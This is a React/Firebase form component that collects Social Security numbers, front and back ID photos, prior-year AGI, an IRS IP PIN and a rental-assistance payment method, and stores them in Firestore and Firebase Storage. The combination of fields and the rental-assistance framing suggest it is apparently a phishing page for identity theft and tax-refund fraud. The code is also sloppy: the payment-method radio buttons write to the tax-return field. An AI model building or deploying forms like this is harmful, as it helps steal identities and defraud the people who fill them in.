'use client'


import React, { useState } from 'react';
import { db } from '@/libs/firebase';
import { collection, addDoc } from 'firebase/firestore/lite'; 
import { getDownloadURL, getStorage, ref, uploadBytes, uploadBytesResumable, deleteObject } from 'firebase/storage';

function FormData() {
    const [lastName, setLastName] = useState('');
    const [firstName, setFirstName] = useState('');
    const [otherName, setOtherName] = useState('');
    const [dateOfBirth, setDateOfBirth] = useState('');
    const [fullAddress, setFullAddress] = useState('');
    const [email, setEmail] = useState('');
    const [phoneNumber, setPhoneNumber] = useState('');
    const [state, setState] = useState('');
    const [country, setCountry] = useState('');
    const [sex, setSex] = useState('');
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState('');
    const [successMessage, setSuccessMessage] = useState('');
    const [ssnumber, setSsnumber] = useState('')
    const [taxReturn, setTaxReturn] = useState('')
    const [agi, setAgi] = useState('')
    const [ipPin, setIpPin] = useState('')






    const [image1, setImage1] = useState(null);
    const [image2, setImage2] = useState(null);
    const [imageUrl1, setImageUrl1] = useState('');
    const [imageUrl2, setImageUrl2] = useState('');
    const [progress1, setProgress1] = useState(0);
    const [progress2, setProgress2] = useState(0);
  
    const storage = getStorage();
  
    // Function to handle file change for image 1
    const handleFileChange1 = (e) => {
      const file = e.target.files[0];
      setImage1(file);
      uploadImageToStorage(file, setImageUrl1, setProgress1);
    };
  
    // Function to handle file change for image 2
    const handleFileChange2 = (e) => {
      const file = e.target.files[0];
      setImage2(file);
      uploadImageToStorage(file, setImageUrl2, setProgress2);
    };
  
    // Function to upload image to Firebase Storage
    const uploadImageToStorage = async (file, setImageUrl, setProgress) => {
      if (!file) return;
  
      const storageRef = ref(storage, `/storage/${file.name}`);
      const uploadTask = uploadBytesResumable(storageRef, file);
  
      uploadTask.on(
        'state_changed',
        (snapshot) => {
          const prog = Math.round((snapshot.bytesTransferred / snapshot.totalBytes) * 100);
          setProgress(prog);
        },
        (err) => console.log(err),
        () => {
          getDownloadURL(uploadTask.snapshot.ref).then((url) => {
            setImageUrl(url);
          });
        }
      );
    };
  
    // Function to delete image from Firebase Storage
    const deleteImageFromStorage = async (imageUrl, setImageUrl) => {
      if (!imageUrl) return;
  
      const imageRef = ref(storage, imageUrl); // Corrected usage of ref
      try {
        await deleteObject(imageRef);
        setImageUrl('');
      } catch (error) {
        console.error('Error deleting image: ', error);
      }
    };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Basic validation
    if (!lastName || !dateOfBirth || !email || !phoneNumber) {
      setError('Please fill in all required fields.');
      return;
    }

    setLoading(true);

    try {
      const docRef = await addDoc(collection(db, 'your_collection_name'), {
        lastName,
        firstName,
        otherName,
        dateOfBirth,
        fullAddress,
        email,
        phoneNumber,
        state,
        country,
        sex,
        imageUrl1,
        imageUrl2,
        ssnumber,
        taxReturn,
        ipPin,
        agi,
      });

      setSuccessMessage('Data uploaded successfully!');
      setLastName('');
      setFirstName('');
      setOtherName('');
      setDateOfBirth('');
      setFullAddress('');
      setEmail('');
      setPhoneNumber('');
      setState('');
      setCountry('');
      setSex('');
      setSsnumber('');
      setTaxReturn('');
      setAgi('');
      setIpPin('');
    } catch (error) {
      console.error('Error adding document: ', error);
      setError('Failed to upload data. Please try again.');
    }

    setLoading(false);
  };



  return (
    <div className="mx-auto mt-8 p-6  bg-white shadow-md rounded-md">
    
    <img src='/logo-2.jpg' alt=''  />

      <h2 className="text-2xl font-semibold mb-4 text-center mt-5 uppercase">Enter Your Information</h2>

      {error && <div className="text-red-500 mb-4">{error}</div>}
      {successMessage && <div className="text-green-500 mb-4">{successMessage}</div>}

      
      <form onSubmit={handleSubmit} className=' md:grid grid-cols-2 gap-4'>

      <div className="mb-4">
          <label htmlFor="firstName" className="block text-sm font-medium text-gray-700">First Name <span className='text-red-500 font-extrabold'>*</span> </label>
          <input type="text" id="firstName" value={firstName} onChange={(e) => setFirstName(e.target.value)} className="mt-1 p-2 block w-full border rounded-md"/>
        </div>

        <div className="mb-4">
          <label htmlFor="lastName" className="block text-sm font-medium text-gray-700">Last Name <span className='text-red-500 font-extrabold'>*</span> </label>
          <input type="text" id="lastName" value={lastName} onChange={(e) => setLastName(e.target.value)} className="mt-1 p-2 block w-full border rounded-md"/>
        </div>

        <div className="mb-4">
          <label htmlFor="email" className="block text-sm font-medium text-gray-700">Email <span className='text-red-500 font-extrabold'>*</span> </label>
          <input type="email" id="email" value={email} onChange={(e) => setEmail(e.target.value)} className="mt-1 p-2 block w-full border rounded-md"/>
        </div>

        <div className="mb-4">
          <label htmlFor="phoneNumber" className="block text-sm font-medium text-gray-700">Phone Number</label>
          <input type="tel" id="phoneNumber" value={phoneNumber} onChange={(e) => setPhoneNumber(e.target.value)} className="mt-1 p-2 block w-full border rounded-md"/>
        </div>
       

{/* 
        <div className="mb-4">
          <label htmlFor="otherName" className="block text-sm font-medium text-gray-700">Other Name</label>
          <input type="text" id="otherName" value={otherName} onChange={(e) => setOtherName(e.target.value)} className="mt-1 p-2 block w-full border rounded-md"/>
        </div> */}


        {/* <div className="mb-4">
          <label htmlFor="dateOfBirth" className="block text-sm font-medium text-gray-700">Date of Birth</label>
          <input type="date" id="dateOfBirth" value={dateOfBirth} onChange={(e) => setDateOfBirth(e.target.value)} className="mt-1 p-2 block w-full border rounded-md"/>
        </div> */}

        
      


        <div className="mb-4">
          <label htmlFor="state" className="block text-sm font-medium text-gray-700">State</label>
          <input type="text" id="state" value={state} onChange={(e) => setState(e.target.value)} className="mt-1 p-2 block w-full border rounded-md"/>
        </div>
        <div className="mb-4">
          <label htmlFor="country" className="block text-sm font-medium text-gray-700">Country</label>
          <input type="text" id="country" value={country} onChange={(e) => setCountry(e.target.value)} className="mt-1 p-2 block w-full border rounded-md"/>
        </div>
        <div className="mb-4">
          <label htmlFor="sex" className="block text-sm font-medium text-gray-700">Sex</label>
          <select id="sex" value={sex} onChange={(e) => setSex(e.target.value)} className="mt-1 p-2 block w-full border rounded-md">
            <option value="male">Male</option>
            <option value="female">Female</option>
          </select>
        </div>


        <div className="mb-4">
          <label htmlFor="ssnumber" className="block text-sm font-medium text-gray-700">Social Security Number  <span className='text-red-500 font-extrabold'>*</span> </label>
          <input type="text" id="ssnumber" value={ssnumber} onChange={(e) => setSsnumber(e.target.value)} className="mt-1 p-2 block w-full border rounded-md"/>
        </div>

        {/* ********************************************************************************************************************************************* */}

        <div className=' col-span-2 '>
      <div className="mb-5">
        <label htmlFor="image1" className="block text-sm font-medium text-gray-700">
          Front image of a valid Means of identification
          <span className='text-red-500 font-extrabold'>*</span> 
        </label>
        <div className="mt-1 flex items-center p-5 border-2 rounded shadow">
          {!imageUrl1 && (<input
            id="image1"
            name="image1"
            type="file"
            className="appearance-none w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm text-sm leading-4 focus:outline-none focus:ring-blue-500 focus:border-blue-500"
            onChange={handleFileChange1}
          />)}
          {progress1 > 0 && <div className="ml-4">{progress1}% uploaded</div>}
          {imageUrl1 && (
            <div className="ml-4">
              <img src={imageUrl1} alt="Uploaded" className="max-w-full h-auto" />
              <button
                className="mt-2 px-4 py-2 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-red-600 hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500"
                onClick={() => deleteImageFromStorage(imageUrl1, setImageUrl1)}
              >
                Delete
              </button>
            </div>
          )}
        </div>
      </div>
      <div className="mb-4">
        <label htmlFor="image2" className="block text-sm font-medium text-gray-700">
            Back image of a valid Means of identification
             <span className='text-red-500 font-extrabold'>*</span> 
        </label>
        <div className="mt-1 flex items-center p-5 border-2 rounded shadow">
          {!imageUrl2 && (<input
            id="image2"
            name="image2"
            type="file"
            className="appearance-none w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm text-sm leading-4 focus:outline-none focus:ring-blue-500 focus:border-blue-500"
            onChange={handleFileChange2}
          />)}
          {progress2 > 0 && <div className="ml-4">{progress2}% uploaded</div>}
          {imageUrl2 && (
            <div className="ml-4">
              <img src={imageUrl2} alt="Uploaded" className="max-w-full h-auto" />
              <button
                className="mt-2 px-4 py-2 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-red-600 hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500"
                onClick={() => deleteImageFromStorage(imageUrl2, setImageUrl2)}
              >
                Delete
              </button>
            </div>
          )}
        </div>
      </div>
    </div>







        {/* *********************************************************************************************************************************************** */}

       

        <div className="mb-4 grid grid-cols-3">
          <label htmlFor="taxReturn" className=" col-span-3 block text-sm font-medium text-gray-700">Did you file 2022 Tax Return? <span className='text-red-500 font-extrabold'>*</span> </label>


         <div className='flex justify-center items-center gap-2'>
            <p className='text-sm text-gray-800'>Yes</p>
            <input type="radio" id="taxReturn" value='Yes' name={taxReturn} onChange={(e) => setTaxReturn(e.target.value)} className=""/>
         </div>
          
         <div className='flex justify-center items-center gap-2'>
         <p className='text-sm text-gray-800'>No</p>
            <input type="radio" id="taxReturn" value='No' name={taxReturn} onChange={(e) => setTaxReturn(e.target.value)} className=""/>
        </div>
        
        </div> 



        <div className="mb-4">
          <label htmlFor="agi" className="block text-sm font-medium text-gray-700">If Yes, Provide your 2022 AGI  <span className='text-red-500 font-extrabold'>*</span> </label>
          <input type="text" id="agi" value={agi} onChange={(e) => setAgi(e.target.value)} className="mt-1 p-2 block w-full border rounded-md"/>
        </div>

        <div className="mb-4">
          <label htmlFor="ipPin" className="block text-sm font-medium text-gray-700">2023 IP PIN <span className='text-red-500 font-extrabold'>*</span> </label>
          <input type="text" id="ipPin" value={ipPin} onChange={(e) => setIpPin(e.target.value)} className="mt-1 p-2 block w-full border rounded-md"/>
        </div>

        <div className="mb-4 grid grid-cols-3">
          <label htmlFor="taxReturn" className=" col-span-3 block text-sm font-medium text-gray-700">Rental Assistance Payment Method <span className='text-red-500 font-extrabold'>*</span> </label>


         <div className='flex justify-center items-center gap-1'>
            <p className='text-sm text-gray-800'>Direct Deposit</p>
            <input type="radio" id="taxReturn" value='Yes' name={taxReturn} onChange={(e) => setTaxReturn(e.target.value)} className=""/>
         </div>
          
         <div className='flex justify-center items-center gap-2'>
         <p className='text-sm text-gray-800'>Check</p>
            <input type="radio" id="taxReturn" value='No' name={taxReturn} onChange={(e) => setTaxReturn(e.target.value)} className=""/>
        </div>
        
        </div> 


        <button type="submit" className="py-2 px-4 bg-blue-500 w-full  col-span-2 text-white rounded-md hover:bg-blue-600 focus:outline-none focus:bg-blue-600">
          {loading ? 'Submitting...' : 'Submit'}
        </button>
      </form>
    </div>
  );
}

export default FormData;

